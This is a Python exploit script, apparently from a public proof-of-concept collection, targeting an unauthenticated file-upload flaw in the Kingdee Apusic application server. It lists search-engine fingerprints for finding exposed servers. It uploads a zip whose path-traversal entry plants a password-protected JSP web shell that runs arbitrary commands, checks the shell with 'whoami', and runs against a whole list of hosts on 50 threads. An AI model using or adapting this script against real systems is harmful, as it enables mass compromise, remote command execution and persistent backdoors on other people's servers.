#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa：app="Apusic应用服务器"  fid="rqhtFwF4sIF7wTOroKTQGw=="
# zoomeye:Apusic应用服务器
# hunter: web.similar_id="c85578f46ba3b40d6c07fd0f502c090b"


import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()
if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Kingdee_Apusic_AppServer_Upload_File_Poc.py url.txt                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
}  
def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "Host": "%s" %host2,
        "Accept-Encoding": "gzip",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko)Version/12.0.3 Safari/605.1.15",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryd9acIBdVuqKWDJbd"
    }
    data ='------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="appName"\r\n\r\n333\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="deployInServer"\r\n\r\nfalse\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="clientFile"; filename="aaaa.zip"\r\nContent-Type: application/x-zip-compressed\r\n\r\n'+r'{{unquote("PK\x03\x04\x14\x00\x00\x00\x00\x00\xe5y\x09Uk\x0a\xc8\xe7d\x01\x00\x00d\x01\x00\x007\x00\x00\x00../../../../applications/default/public_html/shell2.jsp<%\x0d\x0a    if \x28\"admin\".equals\x28request.getParameter\x28\"pwd\"\x29\x29\x29 \x7b\x0d\x0a        java.io.InputStream input = Runtime.getRuntime\x28\x29.exec\x28request.getParameter\x28\"cmd\"\x29\x29.getInputStream\x28\x29;\x0d\x0a        int len = -1;\x0d\x0a        byte[] bytes = new byte[4092];\x0d\x0a        while \x28\x28len = input.read\x28bytes\x29\x29 != -1\x29 \x7b\x0d\x0a            out.println\x28new String\x28bytes, \"GBK\"\x29\x29;\x0d\x0a        \x7d\x0d\x0a    \x7d\x0d\x0a%>PK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00\xe5y\x09Uk\x0a\xc8\xe7d\x01\x00\x00d\x01\x00\x007\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\x00\x00\x00\x00../../../../applications/default/public_html/shell2.jspPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00e\x00\x00\x00\xb9\x01\x00\x00\x00\x00")}}'+'\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="archivePath"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="baseContext"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="startType"\r\n\r\nauto\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="loadon"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="virtualHost"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="allowHosts"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name="denyHosts"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd--'
    vulurl = url + "/admin//protect/application/deployApp"
    vulurl1 = url + "/shell2.jsp?pwd=admin&cmd=whoami"
    
    try:
        r = requests.post(vulurl, headers=headers,data=data,verify=False)
        if  r.status_code==200:
            #print(url+"存在上传接口")
            r2=requests.get(vulurl1,headers=headers,verify=False)
            if r2.status_code==200:
                print("文件地址为:"+url+"/shell2.jsp?pwd=admin&cmd=whoami")
            #print("http://"+host+":true 文件地址为："+"")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])